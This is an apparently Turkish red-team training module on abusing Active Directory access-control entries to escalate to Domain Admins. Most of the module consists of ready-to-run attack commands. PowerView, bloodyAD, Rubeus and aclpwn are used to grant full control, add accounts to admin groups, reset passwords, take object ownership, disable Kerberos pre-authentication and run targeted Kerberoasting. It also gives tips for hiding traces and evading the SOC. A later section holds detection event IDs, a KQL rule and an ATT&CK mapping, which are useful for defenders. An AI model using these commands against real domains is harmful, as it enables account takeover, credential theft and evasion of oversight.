## 1. Genel Bakış ve Mimari Temel

Active Directory mimarisinde yetki yükseltme (Privilege Escalation), çoğu senaryoda ikili bir yazılım zafiyeti (binary exploit) veya çekirdek açığı gerektirmez. Kurumsal ortamlarda on yıllar boyunca biriken hatalı delegasyonlar, unutulmuş helpdesk izinleri ve özelleştirilmiş güvenlik tanımlayıcıları (Security Descriptors); saldırganlara meşru API çağrılarıyla etki alanı yöneticiliğine (Domain Admins) sıçrama imkânı sunar.

Her Active Directory nesnesi (kullanıcı, bilgisayar, grup, GPO, OU), `nTSecurityDescriptor` ikili özniteliğinde saklanan bir **Güvenlik Tanımlayıcısı (Security Descriptor)** taşır:
- **DACL (Discretionary Access Control List):** Hangi kullanıcı veya güvenlik grubunun (Principal) bu nesne üzerinde hangi haklara (ACE - Access Control Entry) sahip olduğunu tanımlar.
- **SACL (System Access Control List):** Hangi eylemlerin Windows Güvenlik Olay Günlüğü'ne (Event Log) denetim kaydı (audit) olarak düşeceğini belirler.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    DACL VE ACE SÖMÜRÜ MİMARİ AKIŞI                          │
└─────────────────────────────────────────────────────────────────────────────┘
                                      │
                                      ▼
            [1. Dizin Keşfi ve Graf Analizi (BloodHound / PowerView)]
            - Get-DomainObjectAcl veya Cypher ile tehlikeli ACE analizi
            - Saldırgan SID'si (jdoe) ──▶ Hedef Nesne (svc-sql / DA Grubu)
                                      │
                                      ▼
            [2. Tespit Edilen ACE Türüne Göre Sömürü Yolu Seçimi]
            ┌─────────────────────────┬─────────────────────────┐
            │                         │                         │
            ▼                         ▼                         ▼
   [GenericAll / WriteDacl]   [GenericWrite / WriteProp] [ForceChangePassword]
   - Kendine FullControl ver  - Targeted Kerberoasting  - Parola bilmeden
   - nTSecurityDescriptor yaz   (SPN özniteliği yaz)      doğrudan sıfırla
   - Sahiplik ve izin gaspı   - DONT_REQ_PREAUTH (AS-REP)- ⚠️ Gürültülü / Servis
                              - RBCD / Shadow Cred        kesintisi riski!
                                      │
                                      ▼
            [3. Yetki Sıçraması ve Yanal / Dikey Geçiş]
            - Hedef kimlikle Kerberos bileti (TGT/TGS) veya NT Hash elde etme
            - Tier-0 / Domain Admins veya DCSync (Modül 09) aşamasına geçiş
```

### 1.1 Kritik AccessMask ve Hak Eşleştirmeleri

| Active Directory Hakkı | AccessMask Hex / OID | Sömürü Mekanizması ve Operasyonel Etki |
|---|---|---|
| **GenericAll** | `0x10000000` | Hedef üzerinde tam denetim. Parola sıfırlama, grup üyesi yapma, SPN veya Shadow Credential yazma. |
| **WriteDacl** | `0x00040000` | Hedefin DACL listesine yeni ACE ekleme. Operatör kendi hesabına anında `GenericAll` atayabilir. |
| **WriteOwner** | `0x00080000` | Nesnenin sahipliğini (`OwnerSID`) ele geçirme. Windows modelinde nesne sahibi her zaman DACL yazabilir. |
| **GenericWrite / WriteProperty** | `0x40000000` / `0x00000020` | Hedefin özniteliklerine yazma (`servicePrincipalName`, `userAccountControl`, `scriptPath`). |
| **ExtendedRight (ForceChangePassword)** | `00299570-246d-11d0-a768-00aa006e0529` | Kullanıcının mevcut parolasını bilmeksizin yeni bir parola zorla atama. |
| **Self (AddSelf / Validated Write)** | `0x00000008` (Self) | Bir grubun üye listesine (`member`) yalnızca kendi hesabını ekleyebilme hakkı. |
| **AllExtendedRights** | `0x00000100` (Control Access) | ForceChangePassword, SendAs, ReceiveAs ve domain kökünde `DS-Replication-Get-Changes-All` (DCSync). |

## 2. Derinlemesine Sömürü Teknikleri

### 2.1 Targeted Kerberoasting (GenericWrite ile Parola Değiştirmeden Ele Geçirme)
Bir kullanıcı veya bilgisayar hesabı üzerinde `GenericWrite` veya `WriteProperty (servicePrincipalName)` hakkı bulunduğunda, hesaba yapay bir SPN atanarak Service Ticket (TGS) talep edilir ve SPN geri silinir:
- **Neden Tercih Edilir?** Parola sıfırlanmaz; gerçek kullanıcı veya arka plan servisi kesintiye uğramaz. SOC ekipleri parola sıfırlama olaylarını (4724) anlık izlerken, geçici SPN değişiklikleri genellikle gözden kaçar.

### 2.2 userAccountControl Manipülasyonu (DONT_REQ_PREAUTH)
Hedef hesapta `userAccountControl` özniteliğini yazma hakkı (`WriteProperty: userAccountControl`) varsa:
- `DONT_REQ_PREAUTH (0x00400000)` bayrağı aktif edilir.
- Hesaptan Kerberos ön-kimlik doğrulaması olmaksızın AS-REP bileti çekilir ([03.1](../Modul_03_Kimlik_Bilgisi_Erisimi/03.1_Kerberoasting_ve_AS_REP_Roasting.md)).
- Hash offline kırıldıktan sonra UAC bayrağı eski haline döndürülür.

### 2.3 Dynamic Objects ve Anti-Forensics (`entryTTL`)
Active Directory Lightweight Directory Services ve modern AD şemalarında dinamik nesneler (Dynamic Objects) oluşturulabilir. Saldırgan `entryTTL` özniteliğini kullanarak belirli bir süre (örneğin 900 saniye) sonra kendiliğinden dizinden silinen geçici kullanıcı/bilgisayar nesneleri açabilir. Bu teknik adli bilişim incelemelerinde diskte kalıcı nesne izi bırakmamak için kullanılır.

## 3. Pratik Sömürü Senaryoları ve Araç Kullanımı

### Senaryo 1: PowerView ile WriteDacl → FullControl → Grup Üyeliği
```powershell
# 1. Hedef grup üzerindeki izinleri doğrula
Get-DomainObjectAcl -TargetIdentity "Tier1-Admins" -ResolveGUIDs | ? { $_.SecurityIdentifier -eq (Get-DomainUser jdoe).objectsid }

# 2. WriteDacl hakkını kullanarak kendi kullanıcımıza GenericAll (FullControl) tanı
Add-DomainObjectAcl -TargetIdentity "Tier1-Admins" -PrincipalIdentity jdoe -Rights All

# 3. Kendimizi hedef gruba ekle
Add-DomainGroupMember -Identity "Tier1-Admins" -Members jdoe

# 4. Grup üyeliğini teyit et
Get-DomainGroupMember -Identity "Tier1-Admins"
```

### Senaryo 2: Linux Üzerinden bloodyAD ile Tek Komutla Parola Değiştirme (GenericAll / ForceChangePassword)
```bash
# ForceChangePassword veya GenericAll hakkı ile parolanın bilinmesine gerek kalmadan doğrudan sıfırlama
bloodyAD -u jdoe -p 'Welcome123!' -d corp.local --host 10.10.10.5 set password svc-sql 'NewSecureP@ss2026!'

# NetExec ile yeni parola üzerinden erişimi doğrula
nxc smb 10.10.10.5 -u svc-sql -p 'NewSecureP@ss2026!'
```

### Senaryo 3: Targeted Kerberoasting (PowerView + Rubeus)
```powershell
# 1. svc-app hesabına sahte bir SPN ata
Set-DomainObject -Identity svc-app -Set @{serviceprincipalname='fake/targetedroast'}

# 2. Rubeus ile TGS biletini iste ve hash'i yakala
Rubeus.exe kerberoast /user:svc-app /nowrap

# 3. İzi temizlemek için SPN özniteliğini derhal temizle
Set-DomainObject -Identity svc-app -Clear serviceprincipalname
```

### Senaryo 4: aclpwn ile Kanıtlanmış Graf Yollarının Otomatik Sömürüsü
```bash
# BloodHound REST API'sine bağlanıp jdoe'dan Domain Admins'e giden en kısa DACL yolunu otomatik uygula
aclpwn -du jdoe -dp 'Welcome123!' -d corp.local -s 10.10.10.5 -to "Domain Admins"
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata / İstisna Mesajı | Kök Neden Analizi | Kesin Çözüm ve Operasyonel Adım |
|---|---|---|
| `INSUFFICIENT_ACCESS_RIGHTS (0x32 / 50)` | Operatörün hesap SID'si hedef nesnenin DACL'inde gerekli yazma bitine (`WRITE_DAC`, `WRITE_PROP`) sahip değil. | Token gruplarınızı (`whoami /groups`) kontrol edin; kullanıcı değil üyesi olduğunuz bir grup üzerinden yetki tanımlanmış olabilir. |
| `WILL_NOT_PERFORM (0x35 / 53) - Password policy violation` | Parola sıfırlama girişimi etki alanı parola karmaşıklığı veya geçmişi (Password History) ilkelerine takıldı. | Kurumsal politika gereksinimlerine uygun (büyük/küçük harf, rakam, özel karakter, 15+ uzunluk) bir parola dizesi belirleyin. |
| `CONSTRAINT_VIOLATION (0x13 / 19) - SPN already exists` | Targeted Kerberoasting için eklenmek istenen SPN etki alanında başka bir nesnede zaten tanımlı. | Benzersiz bir SPN dizesi üretin (`fake/svc-app-randomstring123`) ve etki alanında çakışma olmadığını `Get-DomainUser -SPN` ile denetleyin. |
| `ACCESS_DENIED (AdminSDHolder koruması)` | Hedef nesne korunan bir grupta (Domain Admins vb.) ve `adminCount=1`. DACL kalıtımı kopuk. | Korunan nesneler üzerindeki geçici ACE'ler 60 dk içinde silinir. Yetkiyi doğrudan nesneye değil, AdminSDHolder nesnesinin kendisine verin. |
| `LDAP: Strong Auth Required (0x8)` | DC, LDAP signing veya LDAP üzerinden TLS (LDAPS / Port 636) zorunluluğu uyguluyor. | Bağlantı komutuna `-k` (Kerberos), `--use-ldaps` veya `-ssl` bayrağını ekleyerek 636 portu üzerinden şifreli tünelleme yapın. |
| `Kerberos pre-authentication failed (KDC_ERR_PREAUTH_FAILED)` | UAC'den `DONT_REQ_PREAUTH` bayrağı kaldırılmadan önce eski parola ile bilet talep edildi. | Öznitelik yazma işleminin DC üzerinde tamamlandığını doğrulayın (`Get-DomainUser -Identity target -Properties useraccountcontrol`). |

## 5. OPSEC ve Karşı Tespit (IOC & Telemetry)

### 5.1 Olay Günlüğü İmzaları (Windows Security Logs)
- **Event ID 5136 (Dizin Hizmeti Nesnesi Değiştirildi):** Bir nesnenin `nTSecurityDescriptor`, `servicePrincipalName`, `userAccountControl` veya `member` özniteliği değiştiğinde üretilir. **SACL yapılandırılmış olmalıdır.**
- **Event ID 4724 (Hesap Parolası Sıfırlama Girişimi):** `ForceChangePassword` veya `Set-DomainUserPassword` çağrıldığında tetiklenir. `TargetUserName` ve sıfırlamayı yapan `SubjectUserName` loglanır.
- **Event ID 4738 (Kullanıcı Hesabı Değiştirildi):** Kullanıcı nesnesinin SPN'i veya UAC bayrakları modifiye edildiğinde düşer.
- **Event ID 4662 (Bir Nesne Üzerinde İşlem Gerçekleştirildi):** Genişletilmiş hakların (Extended Rights) kullanılması sırasında AccessMask ve GUID ile denetlenir.

### 5.2 SIEM / EDR Tespit Kuralı (KQL / Sigma)
```kql
// KQL: Kısa Sürede SPN Eklenip Silinmesi (Targeted Kerberoasting Tespiti)
SecurityEvent
| where EventID == 5136 and ObjectClass =~ "user"
| where AttributeLDAPDisplayName =~ "servicePrincipalName"
| project TimeGenerated, Computer, SubjectAccount, TargetAccount = ObjectDN, OperationType, AttributeValue
| summarize Count = count(), Operations = make_set(OperationType) by TargetAccount, bin(TimeGenerated, 5m)
| where Count >= 2 and Operations has "Value Added" and Operations has "Value Deleted"
```

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Operasyonel Kullanım Aşaması |
|---|---|---|
| **T1098** | Account Manipulation | Parola sıfırlama, ek kimlik bilgisi (Shadow Credential) enjeksiyonu. |
| **T1222.001** | File and Directory Permissions Modification: Windows DACL | `WriteDacl` ile hedef nesneye `GenericAll` ACE eklenmesi. |
| **T1558.003** | Steal or Forge Kerberos Tickets: Kerberoasting | `GenericWrite` ile SPN atanarak TGS hash'i çıkarılması. |
| **T1078.002** | Valid Accounts: Domain Accounts | Yetki yükseltme sonrası meşru hesap kimliğinin devralınması. |

## 6. Hızlı Referans / Cheat Sheet

### Komut 1: PowerView ile Hedef Nesnede Kendine Tam Denetim (GenericAll) Verme
```powershell
Add-DomainObjectAcl -TargetIdentity "Tier1-Admins" -PrincipalIdentity jdoe -Rights All
```
- **Ne Yapar?** `WriteDacl` hakkına sahip olunan `Tier1-Admins` grubunun DACL'ine `jdoe` için tam denetim (FullControl) ACE'si ekler.
- **Ne Zaman Kullanılır?** Graf analizinde hedef gruba doğrudan üye olunamadığı ancak DACL yazma izninin bulunduğu durumlarda.
- **Parametreler:** `-TargetIdentity`: İznin ekleneceği hedef nesne; `-PrincipalIdentity`: Yetkiyi alacak saldırgan hesabı; `-Rights All`: GenericAll hakkı.

### Komut 2: bloodyAD ile Parola Sıfırlama (ForceChangePassword)
```bash
bloodyAD -u jdoe -p 'Welcome123!' -d corp.local --host 10.10.10.5 set password svc-backup 'P@ssword2026!'
```
- **Ne Yapar?** Hedef kullanıcının mevcut parolasını bilmeden Active Directory üzerinden LDAP protokolüyle yeni bir parola tanımlar.
- **Ne Zaman Kullanılır?** `ForceChangePassword` veya `GenericAll` hakkı bulunan ancak oturum açma kimliği bilinmeyen hesapları ele geçirmek için.
- **Parametreler:** `-u / -p`: Mevcut geçerli hesap; `-d`: Etki alanı FQDN; `--host`: Domain Controller IP; `set password`: Parola sıfırlama eylemi.

### Komut 3: PowerView ile Targeted Kerberoasting SPN Enjeksiyonu
```powershell
Set-DomainObject -Identity svc-web -Set @{serviceprincipalname='http/fake-spn.corp.local'}
```
- **Ne Yapar?** Normalde Kerberoast edilemeyen bir kullanıcı hesabına `servicePrincipalName` özniteliği yazarak servis hesabına dönüştürür.
- **Ne Zaman Kullanılır?** `GenericWrite` hakkı bulunan hesaplarda parola değiştirmeden offline hash elde etmek istendiğinde.
- **Parametreler:** `-Identity`: Hedef hesap; `-Set @{serviceprincipalname=...}`: Yazılacak sahte SPN dizesi.

### Komut 4: Targeted Kerberoasting Sonrası SPN Temizleme
```powershell
Set-DomainObject -Identity svc-web -Clear serviceprincipalname
```
- **Ne Yapar?** Bilet çekildikten sonra nesne üzerindeki SPN özniteliğini tamamen temizleyerek hesabı standart kullanıcı durumuna döndürür.
- **Ne Zaman Kullanılır?** Bilet alma işlemi tamamlanır tamamlanmaz IOC izini gizlemek ve alarm tetiklenmesini önlemek için.
- **Parametreler:** `-Identity`: Hedef hesap; `-Clear serviceprincipalname`: Özniteliğin değerini boşaltır.

### Komut 5: bloodyAD ile Nesne Sahipliğini (Owner) Değiştirme
```bash
bloodyAD -u jdoe -p 'Welcome123!' -d corp.local --host 10.10.10.5 set owner "Server-Admins" jdoe
```
- **Ne Yapar?** `WriteOwner` hakkı bulunan bir güvenlik grubunun `OwnerSID` alanını saldırganın hesabına (`jdoe`) atar.
- **Ne Zaman Kullanılır?** Sahiplik üzerinden örtük `WRITE_DAC` yetkisi kazanıp ardından tam kontrol elde etmek için.
- **Parametreler:** `set owner`: Sahiplik atama komutu; `"Server-Admins"`: Hedef nesne; `jdoe`: Yeni sahip.

### Komut 6: PowerView ile UAC Üzerinde DONT_REQ_PREAUTH Bayrağı Açma
```powershell
Set-DomainObject -Identity jsmith -XOR @{useraccountcontrol=4194304}
```
- **Ne Yapar?** Hedef kullanıcının `userAccountControl` özniteliğinde `DONT_REQ_PREAUTH` (bit 4194304 / 0x400000) bayrağını etkinleştirir.
- **Ne Zaman Kullanılır?** AS-REP Roasting saldırısını tetikleyerek parolasız Kerberos AS-REP hash'i yakalamak için.
- **Parametreler:** `-XOR @{useraccountcontrol=4194304}`: Mevcut UAC değerine pre-auth zorunluluğunu kaldıran biti ekler/kaldırır.
